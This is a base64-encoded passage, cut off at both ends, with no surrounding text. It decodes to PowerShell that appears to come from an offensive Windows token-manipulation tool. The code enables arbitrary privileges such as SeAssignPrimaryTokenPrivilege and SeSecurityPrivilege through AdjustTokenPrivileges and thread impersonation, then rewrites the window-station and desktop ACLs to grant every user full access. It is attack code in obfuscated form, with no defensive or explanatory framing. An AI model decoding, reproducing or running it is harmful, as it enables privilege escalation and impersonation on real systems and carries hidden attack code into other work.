ZXRFbnRyaWVzSW5BY2xXID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFNldEVudHJpZXNJbkFjbFdBZGRyLCAkU2V0RW50cmllc0luQWNsV0RlbGVnYXRlKQoKICAgICRMb2NhbEZyZWVBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBMb2NhbEZyZWUKICAgICRMb2NhbEZyZWVEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgJExvY2FsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb2NhbEZyZWVBZGRyLCAkTG9jYWxGcmVlRGVsZWdhdGUpCgogICAgJExvb2t1cFByaXZpbGVnZU5hbWVXQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBhZHZhcGkzMi5kbGwgTG9va3VwUHJpdmlsZWdlTmFtZVcKICAgICRMb29rdXBQcml2aWxlZ2VOYW1lV0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICRMb29rdXBQcml2aWxlZ2VOYW1lVyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRMb29rdXBQcml2aWxlZ2VOYW1lV0FkZHIsICRMb29rdXBQcml2aWxlZ2VOYW1lV0RlbGVnYXRlKQogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCiAgICAjVXNlZCB0byBhZGQgNjRiaXQgbWVtb3J5IGFkZHJlc3NlcwogICAgRnVuY3Rpb24gQWRkLVNpZ25lZEludEFzVW5zaWduZWQKCXsKCQlQYXJhbSgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQoJCVtJbnQ2NF0KCQkkVmFsdWUxLAoJCQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCgkJW0ludDY0XQoJCSRWYWx1ZTIKCQkpCgkJCgkJW0J5dGVbXV0kVmFsdWUxQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMSkKCQlbQnl0ZVtdXSRWYWx1ZTJCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUyKQoJCVtCeXRlW11dJEZpbmFsQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoW1VJbnQ2NF0wKQoKCQlpZiAoJFZhbHVlMUJ5dGVzLkNvdW50IC1lcSAkVmFsdWUyQnl0ZXMuQ291bnQpCgkJewoJCQkkQ2FycnlPdmVyID0gMAoJCQlmb3IgKCRpID0gMDsgJGkgLWx0ICRWYWx1ZTFCeXRlcy5Db3VudDsgJGkrKykKCQkJewoJCQkJI0FkZCBieXRlcwoJCQkJW1VJbnQxNl0kU3VtID0gJFZhbHVlMUJ5dGVzWyRpXSArICRWYWx1ZTJCeXRlc1skaV0gKyAkQ2FycnlPdmVyCgoJCQkJJEZpbmFsQnl0ZXNbJGldID0gJFN1bSAtYmFuZCAweDAwRkYKCQkJCQoJCQkJaWYgKCgkU3VtIC1iYW5kIDB4RkYwMCkgLWVxIDB4MTAwKQoJCQkJewoJCQkJCSRDYXJyeU92ZXIgPSAxCgkJCQl9CgkJCQllbHNlCgkJCQl7CgkJCQkJJENhcnJ5T3ZlciA9IDAKCQkJCX0KCQkJfQoJCX0KCQllbHNlCgkJewoJCQlUaHJvdyAiQ2Fubm90IGFkZCBieXRlYXJyYXlzIG9mIGRpZmZlcmVudCBzaXplcyIKCQl9CgkJCgkJcmV0dXJuIFtCaXRDb252ZXJ0ZXJdOjpUb0ludDY0KCRGaW5hbEJ5dGVzLCAwKQoJfQoKCiAgICAjRW5hYmxlIFNlQXNzaWduUHJpbWFyeVRva2VuUHJpdmlsZWdlLCBuZWVkZWQgdG8gcXVlcnkgc2VjdXJpdHkgaW5mb3JtYXRpb24gZm9yIGRlc2t0b3AgREFDTAogICAgZnVuY3Rpb24gRW5hYmxlLVNlQXNzaWduUHJpbWFyeVRva2VuUHJpdmlsZWdlCiAgICB7CQoJICAgIFtJbnRQdHJdJFRocmVhZEhhbmRsZSA9ICRHZXRDdXJyZW50VGhyZWFkLkludm9rZSgpCgkgICAgaWYgKCRUaHJlYWRIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQoJICAgIHsKCQkgICAgVGhyb3cgIlVuYWJsZSB0byBnZXQgdGhlIGhhbmRsZSB0byB0aGUgY3VycmVudCB0aHJlYWQiCgkgICAgfQoJCQoJICAgIFtJbnRQdHJdJFRocmVhZFRva2VuID0gW0ludFB0cl06Olplcm8KCSAgICBbQm9vbF0kUmVzdWx0ID0gJE9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQogICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgoJICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkgICAgewoJCSAgICBpZiAoJEVycm9yQ29kZSAtZXEgJFdpbjMyQ29uc3RhbnRzLkVSUk9SX05PX1RPS0VOKQoJCSAgICB7CgkJCSAgICAkUmVzdWx0ID0gJEltcGVyc29uYXRlU2VsZi5JbnZva2UoJFdpbjMyQ29uc3RhbnRzLlNFQ1VSSVRZX0RFTEVHQVRJT04pCgkJCSAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJCQkgICAgewoJCQkJICAgIFRocm93IChOZXctT2JqZWN0IENvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uKQoJCQkgICAgfQoJCQkJCgkJCSAgICAkUmVzdWx0ID0gJE9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQoJCQkgICAgaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKCQkJICAgIHsKCQkJCSAgICBUaHJvdyAoTmV3LU9iamVjdCBDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbikKCQkJICAgIH0KCQkgICAgfQoJCSAgICBlbHNlCgkJICAgIHsKCQkJICAgIFRocm93IChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRFcnJvckNvZGUpCgkJICAgIH0KCSAgICB9CgogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJFRocmVhZEhhbmRsZSkgfCBPdXQtTnVsbAoJCiAgICAgICAgJEx1aWRTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRMVUlEKQogICAgICAgICRMdWlkUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRMdWlkU2l6ZSkKICAgICAgICAkTHVpZE9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRMdWlkUHRyLCBbVHlwZV0kTFVJRCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkTHVpZFB0cikKCgkgICAgJFJlc3VsdCA9ICRMb29rdXBQcml2aWxlZ2VWYWx1ZS5JbnZva2UoJG51bGwsICJTZUFzc2lnblByaW1hcnlUb2tlblByaXZpbGVnZSIsIFtSZWZdICRMdWlkT2JqZWN0KQoKCSAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJICAgIHsKCQkgICAgVGhyb3cgKE5ldy1PYmplY3QgQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb24pCgkgICAgfQoKICAgICAgICBbVUludDMyXSRMdWlkQW5kQXR0cmlidXRlc1NpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJExVSURfQU5EX0FUVFJJQlVURVMpCiAgICAgICAgJEx1aWRBbmRBdHRyaWJ1dGVzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRMdWlkQW5kQXR0cmlidXRlc1NpemUpCiAgICAgICAgJEx1aWRBbmRBdHRyaWJ1dGVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEx1aWRBbmRBdHRyaWJ1dGVzUHRyLCBbVHlwZV0kTFVJRF9BTkRfQVRUUklCVVRFUykKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkTHVpZEFuZEF0dHJpYnV0ZXNQdHIpCgogICAgICAgICRMdWlkQW5kQXR0cmlidXRlcy5MdWlkID0gJEx1aWRPYmplY3QKICAgICAgICAkTHVpZEFuZEF0dHJpYnV0ZXMuQXR0cmlidXRlcyA9ICRXaW4zMkNvbnN0YW50cy5TRV9QUklWSUxFR0VfRU5BQkxFRAoKICAgICAgICBbVUludDMyXSRUb2tlblByaXZTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRUT0tFTl9QUklWSUxFR0VTKQogICAgICAgICRUb2tlblByaXZpbGVnZXNQdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFRva2VuUHJpdlNpemUpCiAgICAgICAgJFRva2VuUHJpdmlsZWdlcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRUb2tlblByaXZpbGVnZXNQdHIsIFtUeXBlXSRUT0tFTl9QUklWSUxFR0VTKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUb2tlblByaXZpbGVnZXNQdHIpCgkgICAgJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VDb3VudCA9IDEKCSAgICAkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZXMgPSAkTHVpZEFuZEF0dHJpYnV0ZXMKCiAgICAgICAgJEdsb2JhbDpUb2tlblByaXYgPSAkVG9rZW5Qcml2aWxlZ2VzCgoJICAgICRSZXN1bHQgPSAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzLkludm9rZSgkVGhyZWFkVG9rZW4sICRmYWxzZSwgW1JlZl0gJFRva2VuUHJpdmlsZWdlcywgJFRva2VuUHJpdlNpemUsIFtJbnRQdHJdOjpaZXJvLCBbSW50UHRyXTo6WmVybykKCSAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJICAgIHsKICAgICAgICAgICAgVGhyb3cgKE5ldy1PYmplY3QgQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb24pCgkgICAgfQoKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRUaHJlYWRUb2tlbikgfCBPdXQtTnVsbAogICAgfQoKCiAgICAjRW5hYmxlIFNlU2VjdXJpdHlQcml2aWxlZ2UsIG5lZWRlZCB0byBxdWVyeSBzZWN1cml0eSBpbmZvcm1hdGlvbiBmb3IgZGVza3RvcCBEQUNMCiAgICBmdW5jdGlvbiBFbmFibGUtUHJpdmlsZWdlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoKV0KICAgICAgICAgICAgW1ZhbGlkYXRlU2V0KCJTZUFzc2lnblByaW1hcnlUb2tlblByaXZpbGVnZSIsICJTZUF1ZGl0UHJpdmlsZWdlIiwgIlNlQmFja3VwUHJpdmlsZWdlIiwgIlNlQ2hhbmdlTm90aWZ5UHJpdmlsZWdlIiwgIlNlQ3JlYXRlR2xvYmFsUHJpdmlsZWdlIiwKICAgICAgICAgICAgICAgICJTZUNyZWF0ZVBhZ2VmaWxlUHJpdmlsZWdlIiwgIlNlQ3JlYXRlUGVybWFuZW50UHJpdmlsZWdlIiwgIlNlQ3JlYXRlU3ltYm9saWNMaW5rUHJpdmlsZWdlIiwgIlNlQ3JlYXRlVG9rZW5Qcml2aWxlZ2UiLAogICAgICAgICAgICAgICAgIlNlRGVidWdQcml2aWxlZ2UiLCAiU2VFbmFibGVEZWxlZ2F0aW9uUHJpdmlsZWdlIiwgIlNlSW1wZXJzb25hdGVQcml2aWxlZ2UiLCAiU2VJbmNyZWFzZUJhc2VQcmlvcml0eVByaXZpbGVnZSIsCiAgICAgICAgICAgICAgICAiU2VJbmNyZWFzZVF1b3RhUHJpdmlsZWdlIiwgIlNlSW5jcmVhc2VXb3JraW5nU2V0UHJpdmlsZWdlIiwgIlNlTG9hZERyaXZlclByaXZpbGVnZSIsICJTZUxvY2tNZW1vcnlQcml2aWxlZ2UiLCAiU2VNYWNoaW5lQWNjb3VudFByaXZpbGVnZSIsCiAgICAgICAgICAgICAgICAiU2VNYW5hZ2VWb2x1bWVQcml2aWxlZ2UiLCAiU2VQcm9maWxlU2luZ2xlUHJvY2Vzc1ByaXZpbGVnZSIsICJTZVJlbGFiZWxQcml2aWxlZ2UiLCAiU2VSZW1vdGVTaHV0ZG93blByaXZpbGVnZSIsICJTZVJlc3RvcmVQcml2aWxlZ2UiLAogICAgICAgICAgICAgICAgIlNlU2VjdXJpdHlQcml2aWxlZ2UiLCAiU2VTaHV0ZG93blByaXZpbGVnZSIsICJTZVN5bmNBZ2VudFByaXZpbGVnZSIsICJTZVN5c3RlbUVudmlyb25tZW50UHJpdmlsZWdlIiwgIlNlU3lzdGVtUHJvZmlsZVByaXZpbGVnZSIsCiAgICAgICAgICAgICAgICAiU2VTeXN0ZW10aW1lUHJpdmlsZWdlIiwgIlNlVGFrZU93bmVyc2hpcFByaXZpbGVnZSIsICJTZVRjYlByaXZpbGVnZSIsICJTZVRpbWVab25lUHJpdmlsZWdlIiwgIlNlVHJ1c3RlZENyZWRNYW5BY2Nlc3NQcml2aWxlZ2UiLAogICAgICAgICAgICAgICAgIlNlVW5kb2NrUHJpdmlsZWdlIiwgIlNlVW5zb2xpY2l0ZWRJbnB1dFByaXZpbGVnZSIpXQogICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAkUHJpdmlsZWdlCiAgICAgICAgKQoKCSAgICBbSW50UHRyXSRUaHJlYWRIYW5kbGUgPSAkR2V0Q3VycmVudFRocmVhZC5JbnZva2UoKQoJICAgIGlmICgkVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKCSAgICB7CgkJICAgIFRocm93ICJVbmFibGUgdG8gZ2V0IHRoZSBoYW5kbGUgdG8gdGhlIGN1cnJlbnQgdGhyZWFkIgoJICAgIH0KCQkKCSAgICBbSW50UHRyXSRUaHJlYWRUb2tlbiA9IFtJbnRQdHJdOjpaZXJvCgkgICAgW0Jvb2xdJFJlc3VsdCA9ICRPcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKCSAgICBpZiAoJFJlc3VsdCAtZXEgJGZhbHNlKQoJICAgIHsKCQkgICAgaWYgKCRFcnJvckNvZGUgLWVxICRXaW4zMkNvbnN0YW50cy5FUlJPUl9OT19UT0tFTikKCQkgICAgewoJCQkgICAgJFJlc3VsdCA9ICRJbXBlcnNvbmF0ZVNlbGYuSW52b2tlKCRXaW4zMkNvbnN0YW50cy5TRUNVUklUWV9ERUxFR0FUSU9OKQoJCQkgICAgaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKCQkJICAgIHsKCQkJCSAgICBUaHJvdyAoTmV3LU9iamVjdCBDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbikKCQkJICAgIH0KCQkJCQoJCQkgICAgJFJlc3VsdCA9ICRPcGVuVGhyZWFkVG9rZW4uSW52b2tlKCRUaHJlYWRIYW5kbGUsICRXaW4zMkNvbnN0YW50cy5UT0tFTl9RVUVSWSAtYm9yICRXaW4zMkNvbnN0YW50cy5UT0tFTl9BREpVU1RfUFJJVklMRUdFUywgJGZhbHNlLCBbUmVmXSRUaHJlYWRUb2tlbikKCQkJICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkJCSAgICB7CgkJCQkgICAgVGhyb3cgKE5ldy1PYmplY3QgQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb24pCgkJCSAgICB9CgkJICAgIH0KCQkgICAgZWxzZQoJCSAgICB7CgkJCSAgICBUaHJvdyAoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkRXJyb3JDb2RlKQoJCSAgICB9CgkgICAgfQoKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRUaHJlYWRIYW5kbGUpIHwgT3V0LU51bGwKCQogICAgICAgICRMdWlkU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kTFVJRCkKICAgICAgICAkTHVpZFB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkTHVpZFNpemUpCiAgICAgICAgJEx1aWRPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTHVpZFB0ciwgW1R5cGVdJExVSUQpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJEx1aWRQdHIpCgoJICAgICRSZXN1bHQgPSAkTG9va3VwUHJpdmlsZWdlVmFsdWUuSW52b2tlKCRudWxsLCAkUHJpdmlsZWdlLCBbUmVmXSAkTHVpZE9iamVjdCkKCgkgICAgaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKCSAgICB7CgkJICAgIFRocm93IChOZXctT2JqZWN0IENvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uKQoJICAgIH0KCiAgICAgICAgW1VJbnQzMl0kTHVpZEFuZEF0dHJpYnV0ZXNTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRMVUlEX0FORF9BVFRSSUJVVEVTKQogICAgICAgICRMdWlkQW5kQXR0cmlidXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkTHVpZEFuZEF0dHJpYnV0ZXNTaXplKQogICAgICAgICRMdWlkQW5kQXR0cmlidXRlcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRMdWlkQW5kQXR0cmlidXRlc1B0ciwgW1R5cGVdJExVSURfQU5EX0FUVFJJQlVURVMpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6RnJlZUhHbG9iYWwoJEx1aWRBbmRBdHRyaWJ1dGVzUHRyKQoKICAgICAgICAkTHVpZEFuZEF0dHJpYnV0ZXMuTHVpZCA9ICRMdWlkT2JqZWN0CiAgICAgICAgJEx1aWRBbmRBdHRyaWJ1dGVzLkF0dHJpYnV0ZXMgPSAkV2luMzJDb25zdGFudHMuU0VfUFJJVklMRUdFX0VOQUJMRUQKCiAgICAgICAgW1VJbnQzMl0kVG9rZW5Qcml2U2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kVE9LRU5fUFJJVklMRUdFUykKICAgICAgICAkVG9rZW5Qcml2aWxlZ2VzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblByaXZTaXplKQogICAgICAgICRUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5Qcml2aWxlZ2VzUHRyLCBbVHlwZV0kVE9LRU5fUFJJVklMRUdFUykKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzUHRyKQoJICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlQ291bnQgPSAxCgkgICAgJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VzID0gJEx1aWRBbmRBdHRyaWJ1dGVzCgogICAgICAgICRHbG9iYWw6VG9rZW5Qcml2ID0gJFRva2VuUHJpdmlsZWdlcwoKICAgICAgICBXcml0ZS1WZXJib3NlICJBdHRlbXB0aW5nIHRvIGVuYWJsZSBwcml2aWxlZ2U6ICRQcml2aWxlZ2UiCgkgICAgJFJlc3VsdCA9ICRBZGp1c3RUb2tlblByaXZpbGVnZXMuSW52b2tlKCRUaHJlYWRUb2tlbiwgJGZhbHNlLCBbUmVmXSAkVG9rZW5Qcml2aWxlZ2VzLCAkVG9rZW5Qcml2U2l6ZSwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKQoJICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCgkgICAgewogICAgICAgICAgICBUaHJvdyAoTmV3LU9iamVjdCBDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbikKCSAgICB9CgogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJFRocmVhZFRva2VuKSB8IE91dC1OdWxsCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRW5hYmxlZCBwcml2aWxlZ2U6ICRQcml2aWxlZ2UiCiAgICB9CgoKICAgICNDaGFuZ2UgdGhlIEFDTCBvZiB0aGUgV2luZG93U3RhdGlvbiBhbmQgRGVza3RvcAogICAgZnVuY3Rpb24gU2V0LURlc2t0b3BBQ0xzCiAgICB7CiAgICAgICAgRW5hYmxlLVByaXZpbGVnZSAtUHJpdmlsZWdlIFNlU2VjdXJpdHlQcml2aWxlZ2UKCiAgICAgICAgI0NoYW5nZSB0aGUgcHJpdmlsZWdlIGZvciB0aGUgY3VycmVudCB3aW5kb3cgc3RhdGlvbiB0byBhbGxvdyBmdWxsIHByaXZpbGVnZSBmb3IgYWxsIHVzZXJzCiAgICAgICAgJFdpbmRvd1N0YXRpb25TdHIgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJpbmdUb0hHbG9iYWxVbmkoIldpblN0YTAiKQogICAgICAgICRoV2luc3RhID0gJE9wZW5XaW5kb3dTdGF0aW9uVy5JbnZva2UoJFdpbmRvd1N0YXRpb25TdHIsICRmYWxzZSwgJFdpbjMyQ29uc3RhbnRzLkFDQ0VTU19TWVNURU1fU0VDVVJJVFkgLWJvciAkV2luMzJDb25zdGFudHMuUkVBRF9DT05UUk9MIC1ib3IgJFdpbjMyQ29uc3RhbnRzLldSSVRFX0RBQykKCiAgICAgICAgaWYgKCRoV2luc3RhIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93IChOZXctT2JqZWN0IENvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uKQogICAgICAgIH0KCiAgICAgICAgU2V0LURlc2t0b3BBQ0xUb0FsbG93RXZlcnlvbmUgLWhPYmplY3QgJGhXaW5zdGEKICAgICAgICAkQ2xvc2VIYW5kbGUuSW52b2tlKCRoV2luc3RhKSB8IE91dC1OdWxsCgogICAgICAgICNDaGFuZ2UgdGhlIHByaXZpbGVnZSBmb3IgdGhlIGN1cnJlbnQgZGVza3RvcCB0byBhbGxvdyBmdWxsIHByaXZpbGVnZSBmb3IgYWxsIHVzZXJzCiAgICAgICAgJGhEZXNrdG9wID0gJE9wZW5EZXNrdG9wQS5JbnZva2UoImRlZmF1bHQiLCAwLCAkZmFsc2UsICRXaW4zMkNvbnN0YW50cy5ERVNLVE9QX0dFTkVSSUNfQUxMIC1ib3IgJFdpbjMyQ29uc3RhbnRzLldSSVRFX0RBQykKICAgICAgICBpZiAoJGhEZXNrdG9wIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93IChOZXctT2JqZWN0IENvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uKQogICAgICAgIH0KCiAgICAgICAgU2V0LURlc2t0b3BBQ0xUb0FsbG93RXZlcnlvbmUgLWhPYmplY3QgJGhEZXNrdG9wCiAgICAgICAgJENsb3NlSGFuZGxlLkludm9rZSgkaERlc2t0b3ApIHwgT3V0LU51bGwKICAgIH0KCgogICAgZnVuY3Rpb24gU2V0LURlc2t0b3BBQ0xUb0FsbG93RXZlcnlvbmUKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICAgICAgW0ludFB0cl0kaE9iamVjdAogICAgICAgICAgICApCgogICAgICAgIFtJbnRQdHJdJHBwU2lkT3duZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgIFtJbnRQdHJdJHBwc2lkR3JvdXAgPSBbSW50UHRyXTo6WmVybwogICAgICAgIFtJbnRQdHJdJHBwRGFjbCA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgW0ludFB0cl0kcHBTYWNsID0gW0ludFB0cl06Olplcm8KICAgICAgICBbSW50UHRyXSRwcFNlY3VyaXR5RGVzY3JpcHRvciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgIzB4NyBpcyB3aW5kb3cgc3RhdGlvbiwgY2hhbmdlIGZvciBvdGhlciB0eXBlcwogICAgICAgICRyZXRWYWwgPSAkR2V0U2VjdXJpdHlJbmZvLkludm9rZSgkaE9iamVjdCwgMHg3LCAkV2luMzJDb25zdGFudHMuREFDTF9TRUNVUklUWV9JTkZPUk1BVElPTiwgW1JlZl0kcHBTaWRPd25lciwgW1JlZl0kcHBTaWRHcm91cCwgW1JlZl0kcHBEYWNsLCBbUmVmXSRwcFNhY2wsIFtSZWZdJHBwU2VjdXJpdHlEZXNjcmlwdG9yKQogICAgICAgIGlmICgkcmV0VmFsIC1uZSAwKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgIlVuYWJsZSB0byBjYWxsIEdldFNlY3VyaXR5SW5mby4gRXJyb3JDb2RlOiAkcmV0VmFsIgogICAgICAgIH0KCiAgICAgICAgaWYgKCRwcERhY2wgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgJEFjbE9iaiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRwcERhY2wsIFtUeXBlXSRBQ0wpCgogICAgICAgICAgICAjQWRkIGFsbCB1c2VycyB0byBhY2wKICAgICAgICAgICAgW1VJbnQzMl0kUmVhbFNpemUgPSAyMDAwCiAgICAgICAgICAgICRwQWxsVXNlcnNTaWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFJlYWxTaXplKQogICAgICAgICAgICAkU3VjY2VzcyA9ICRDcmVhdGVXZWxsS25vd25TaWQuSW52b2tlKDEsIFtJbnRQdHJdOjpaZXJvLCAkcEFsbFVzZXJzU2lkLCBbUmVmXSRSZWF